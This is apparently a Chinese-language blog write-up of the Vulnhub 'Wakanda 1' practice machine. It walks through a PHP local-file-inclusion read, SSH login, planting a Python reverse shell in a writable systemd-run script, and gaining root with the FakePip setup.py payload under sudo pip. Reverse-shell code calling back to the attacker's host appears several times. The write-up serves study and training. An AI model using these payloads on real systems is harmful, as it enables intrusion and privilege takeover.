        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="对wakanda靶机的渗透之旅"><a href="#对wakanda靶机的渗透之旅" class="headerlink" title="-对wakanda靶机的渗透之旅"></a>-对wakanda靶机的渗透之旅</h1><p>​    从vulhub上下载靶机后，本打算在vm上搭建，后发现ova导入有点问题，故在virtualbox上搭建成功，我们需要获得flag1.txt,flag2.txt,root.txt 三个文件的信息，将攻击机，靶机均设为桥接网卡模式，因为我的kali是在vm里面。</p><p>​    靶机下载地址:<a href="https://www.vulnhub.com/entry/wakanda-1,251/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/wakanda-1,251/</a></p><h2 id="0x00-渗透过程"><a href="#0x00-渗透过程" class="headerlink" title="0x00 渗透过程"></a>0x00 渗透过程</h2><h3 id="1-对靶机的信息收集"><a href="#1-对靶机的信息收集" class="headerlink" title="1.对靶机的信息收集"></a>1.对靶机的信息收集</h3><p>攻击机：</p><pre><code>自用kali--IP地址:192.168.1.107</code></pre><p>kali netdiscover 启动:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ebe12b5d.png" alt=""></p><p>​    那么可以得到靶机 IP ：192.168.1.108 ，既然得到了靶机ip地址，那么拿出nmap神器对其进行一波扫描，获得更详细的靶机信息。</p><pre class=" language-bash"><code class="language-bash">nmap -sV 192.168.1.108</code></pre><p><img src="https://i.loli.net/2018/10/06/5bb89ecba4d21.png" alt=""></p><p>​    由nmap扫描得出的信息，开启了80端口的web服务，然后是3333端口的一个Openssh服务，这里需要做一下笔记，ssh连接是3333端口而不是常规的22端口哦！先去80端口访问一下看看情况：</p><p><img src="https://i.loli.net/2018/10/06/5bb89ed45deb8.png" alt=""></p><p>​    emmm,发现就一个普通页面啥也没有，只有一个看似有用的 Made by@mamadou ???难道是个用户名还是个密码啥的？先做笔记记一下，萌新就是什么都要做笔记，接下来扫一下目录看看:</p><p><img src="https://i.loli.net/2018/10/06/5bb89edbcd18b.png" alt=""></p><p>​    扫到几个页面，但是貌似SIZE都是0，被CTF各种虐的我还是选择去看看页面里有没有东西。==&gt;转了一圈发现确实是空的，那咋办，难道渗透之旅到此结束？仔细想了几分钟，既然只有一个页面，忘记看源码了，源码如下:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ee81c834.png" alt=""></p><p>​    这绿的我发慌的一串注释，不用直觉我猜也是靶机的切入点了，lang参数改变会影响页面的语言显示，猜测可能是 lang参数改变了使用的语言php文件，那么就是和文件相关的漏洞咯！</p><p>​    但是只有这一个页面，应该可以检测一下这个参数是否可以进行本地文件包含(Local File Include)，将这唯一的一个页面的完整源码给读下来。利用之前做ctf还算有一点点的经验（参考<a href="https://blog.csdn.net/qq_35544379/article/details/78230629），我们可以用" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629），我们可以用</a> php://filter 这个协议的一些小特性来将源码以base64的形式down下来:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ef3e3358.png" alt=""></p><p>​    然后base64解码得到如下完整的源码：</p><pre><code>&lt;?php$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember itif (isset($_GET[&#39;lang&#39;])){include($_GET[&#39;lang&#39;].&quot;.php&quot;);}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;    &lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&gt;    &lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&gt;    &lt;title&gt;Vibranium Market&lt;/title&gt;    &lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;    &lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&gt;   &lt;/head&gt;  &lt;body class=&quot;text-center&quot;&gt;    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;      &lt;header class=&quot;masthead mb-auto&quot;&gt;        &lt;div class=&quot;inner&quot;&gt;          &lt;h3 class=&quot;masthead-brand&quot;&gt;Vibranium Market&lt;/h3&gt;          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;          &lt;/nav&gt;        &lt;/div&gt;      &lt;/header&gt;      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;        &lt;p class=&quot;lead&quot;&gt;          &lt;?php            if (isset($_GET[&#39;lang&#39;]))          {          echo $message;          }          else          {            ?&gt;            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!            &lt;?php          }?&gt;        &lt;/p&gt;        &lt;p class=&quot;lead&quot;&gt;          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;Learn more&lt;/a&gt;        &lt;/p&gt;      &lt;/main&gt;      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;        &lt;div class=&quot;inner&quot;&gt;          &lt;p&gt;Made by&lt;a href=&quot;#&quot;&gt;@mamadou&lt;/a&gt;&lt;/p&gt;        &lt;/div&gt;      &lt;/footer&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>​    oh！get到一个password：Niamey4Ever227!!!</p><p>​    到现在，我们收集到了作者的名称 mamadou，开放在3333端口的ssh服务，然后一个password。</p><hr><h3 id="2-开始渗透靶机"><a href="#2-开始渗透靶机" class="headerlink" title="2.开始渗透靶机"></a>2.开始渗透靶机</h3><p>​    二话不说，用ssh试试远程登录靶机：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> 192.168.1.108 -l mamadou -p 3333</code></pre><p>​    输入Niamey4Ever227!!!作为密码登录，两秒之后，弹出来一个python shell界面？见识短浅见识短浅，试试用python的pty把完全交互式的终端弄出来。</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pty <span class="token keyword">import</span> spawn<span class="token operator">>></span><span class="token operator">></span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>mamadou@Wakanda1<span class="token punctuation">:</span><span class="token operator">~</span>$ </code></pre><p><img src="https://i.loli.net/2018/10/06/5bb89f067fc33.png" alt=""></p><p>​    问题不大，ls看一下目录，看到了我们要找的第一个flag,也就是flag1.txt，然后cat flag1.txt ==&gt; Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</p><p>​    接下来就是找一下flag2.txt了，到上级目录看到了另外一个用户 devops 的目录，进去看看找到了flag2.txt，但是没有权限，需要以devops的身份打开。</p><p><img src="https://i.loli.net/2018/10/06/5bb89f0ef1687.png" alt=""></p><p>​    去别的目录逛一逛，果然/tmp目录下是有点东西的，但是只是一个test文件，里面含有一个‘test’字符串，并没有什么不同。</p><p>​    看看跟devops有关系的文件有哪些:</p><p><img src="https://i.loli.net/2018/10/06/5bb89f16aa291.png" alt=""></p><p>​    第一个还是仅有的一个就是一个python脚本的样子（忽略后面的setup.py，因为是做完之后写的文章，setup.py是后面我弄进去的文件），看看.antivirus.py内容是啥:</p><pre class=" language-python"><code class="language-python">open<span class="token punctuation">(</span><span class="token string">'/tmp/test'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span></code></pre><p>​    就一行，和test扯上了关系，往之前/tmp/目录下的test文件写入‘test’字符串。这个python脚本是可写的，我能将shell写入其中并且运行，但是反弹的用户却仍然是mamadou，而不是想要的devops，问题在哪呢？思考很久，查了下antivirus的意思’抗生素’，没啥用。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.antivirus.py--payload</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.1.107'</span><span class="token punctuation">,</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/bin/bash'</span><span class="token punctuation">,</span><span class="token string">'-i'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>​    后来经人点拨，恍然大悟，如果这个脚本是会自动运行的，那么就不会反弹mamadou权限的shell了，而是它本身具有的devops权限，而经过查询资料，了解到存放在/src目录下的一般为系统服务类脚本文件，那么它自动运行的假设就显然可以成立了（我还是对有些性质不够了解）。</p><pre><code>#用此命令查看.antivirus.py是否自动运行mamadou@Wakanda1:/srv$ grep -R .antivirus.py / 2&gt;/dev/null/lib/systemd/system/antivirus.service:ExecStart=/usr/bin/env python /srv/.antivirus.py#确实在自动运行，查看一下antivirus.service文件[Unit]Description=AntivirusAfter=network.targetStartLimitIntervalSec=0[Service]Type=simpleRestart=alwaysRestartSec=300User=devopsExecStart=/usr/bin/env python /srv/.antivirus.py[Install]WantedBy=multi-user.target#可以看到是每300秒执行一次</code></pre><p>​    那么接下来，写入的shell原封不动，kali攻击机nc监听7777端口，等待.antivirus.py自动运行(一分一秒地等待总是漫长的）。</p><p><img src="https://i.loli.net/2018/10/06/5bb89f341619f.png" alt=""></p><p>​    果不其然，获得了反弹devops权限的shell，那么cat flag2.txt ==&gt;Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</p><p>​    那么下一步就是拿下root权限，攻入root目录了。</p><hr><h3 id="3-攻破root"><a href="#3-攻破root" class="headerlink" title="3.攻破root"></a>3.攻破root</h3><p>​    先看看devops用户权限大概是怎样的, 执行sudo -l命令：</p><p><img src="https://i.loli.net/2018/10/06/5bb89f44d2154.png" alt=""></p><p>​    然而，只有一个pip命令是可以不需要root权限就能执行的，试试pip install falsk，没问题。</p><p>​    那么怎样才能通过pip来获取root权限呢？这里用到一个github上的开源脚本Fakepip。这个脚本通过在pip重新安装时执行的setup.py文件中插入shellcode，导致其可通过pip反弹root权限的shell给攻击机。项目地址(<a href="https://github.com/0x00-0x00/FakePip.git" target="_blank" rel="noopener">https://github.com/0x00-0x00/FakePip.git</a>)</p><p>​    接下来在攻击机上把Fakepip给git下来,然后进入Fakepip目录,将setup.py中的RHOST参数改为攻击机地址:192.168.1.107,然后启动python的简易服务器。</p><pre><code>from setuptools import setupfrom setuptools.command.install import installimport base64import osclass CustomInstall(install):  def run(self):    install.run(self)    RHOST = &#39;192.168.1.107&#39;  # change this    reverse_shell = &#39;python -c &quot;import os; import pty; import socket; lhost = \&#39;%s\&#39;; lport = 443; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\&#39;HISTFILE\&#39;, \&#39;/dev/null\&#39;); pty.spawn(\&#39;/bin/bash\&#39;); s.close();&quot;&#39; % RHOST    encoded = base64.b64encode(reverse_shell)    os.system(&#39;echo %s|base64 -d|bash&#39; % encoded)setup(name=&#39;FakePip&#39;,      version=&#39;0.0.1&#39;,      description=&#39;This will exploit a sudoer able to /usr/bin/pip install *&#39;,      url=&#39;https://github.com/0x00-0x00/fakepip&#39;,      author=&#39;zc00l&#39;,      author_email=&#39;andre.marques@esecurity.com.br&#39;,      license=&#39;MIT&#39;,      zip_safe=False,      cmdclass={&#39;install&#39;: CustomInstall})</code></pre><p><img src="https://i.loli.net/2018/10/06/5bb89f5460351.png" alt=""></p><p>​    然后在devops靶机上用<code>wget http://192.168.1.107/setup.py</code> 将攻击机上的setup.py下载到本地，攻击机kali开始用nc监听443端口，准备接收即将到来的shell。</p><p>​    在devops靶机上命令pip重装：<code>sudo pip install ./ --upgrade --force-install</code></p><p><img src="https://i.loli.net/2018/10/06/5bb89f60ece0f.png" alt=""></p><p>​    kali兴奋地一把接到反弹过来的shell：</p><p><img src="https://i.loli.net/2018/10/06/5bb89f65ea5ee.png" alt=""></p><p><code>cd root</code> ,然后<code>cat root.txt</code>:</p><p><img src="https://i.loli.net/2018/10/06/5bb89f7108f3e.png" alt=""></p><p>​    萌新的渗透到此暂停emmmm。</p><hr><h2 id="0x01-小知识"><a href="#0x01-小知识" class="headerlink" title="0x01 小知识"></a>0x01 小知识</h2><hr><h3 id="nmap-plus"><a href="#nmap-plus" class="headerlink" title="nmap plus"></a>nmap plus</h3><p>1.特殊扫描方式 ==&gt; nmap -sV/-sP/-sS/sL  其中-sP是用于扫描IP段的</p><p>2.详细地扫描目标：</p><p>nmap -sV 或者 nmap -p- -A  &lt;目标ip&gt;</p><p>或者超强力的： nmap -sS -sV  -A  -p- &lt;目标ip&gt;</p><hr><h3 id="python-反弹shell-amp-pip-get-shell"><a href="#python-反弹shell-amp-pip-get-shell" class="headerlink" title="python 反弹shell &amp; pip get shell"></a>python 反弹shell &amp; pip get shell</h3><p>python 反弹 shell:</p><pre class=" language-bash"><code class="language-bash">python -c <span class="token string">"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</span>192.168.1.107<span class="token string">",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["</span>/bin/sh<span class="token string">","</span>-i<span class="token string">"]);"</span></code></pre><p>python构造完全交互式终端 :</p><pre class=" language-bash"><code class="language-bash"> python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span></code></pre><hr><h3 id="php-filter-and-input-–LFI本地文件包含漏洞"><a href="#php-filter-and-input-–LFI本地文件包含漏洞" class="headerlink" title="php filter and input –LFI本地文件包含漏洞"></a>php filter and input –LFI本地文件包含漏洞</h3><p>参考 <a href="https://blog.csdn.net/qq_35544379/article/details/78230629" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629</a></p><p>php://filter,php://input,php://output都是有妙用的哦！</p><hr><h3 id="msfvenom-p-生成shell"><a href="#msfvenom-p-生成shell" class="headerlink" title="msfvenom -p   生成shell"></a>msfvenom -p   生成shell</h3><p><img src="https://i.loli.net/2018/10/06/5bb89f84ea8cc.png" alt=""></p><p>​    但在渗透过程中发现，不用msfvenom生成的加密shell也能成功反弹，不过还是要养成好习惯，多用用这种神器提高效率并且准确率。</p><p>参考链接 <a href="https://www.cnblogs.com/xishaonian/p/6851475.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6851475.html</a></p><hr><h3 id="linux-中的一些命令与特性"><a href="#linux-中的一些命令与特性" class="headerlink" title="linux 中的一些命令与特性"></a>linux 中的一些命令与特性</h3><p>==&gt; su &amp; sudo </p><p>可用于切换用户</p><p>==&gt; lsattr 是 ls的升级版，就如aptitude 与apt相似一样</p><p>==&gt; find / -user root 2&gt;/dev/null 查看用户属性为root的文件</p><p>==&gt;ps -aux 查看所有服务  ==&gt;top 查看进程</p><hr><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>​    渗透一定一定注意信息收集，思维拓展，然后就是扎实的基础！</p><p>​    作为萌新，没有那么强的能力，确实有点吃力，但是吃力的过程也在进步，就像不停的被虐的过程，自然自己的等级也在提高，不停地膜大神的文章的同时，自己也会受其影响，我是萌新，各位大佬轻喷哦！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
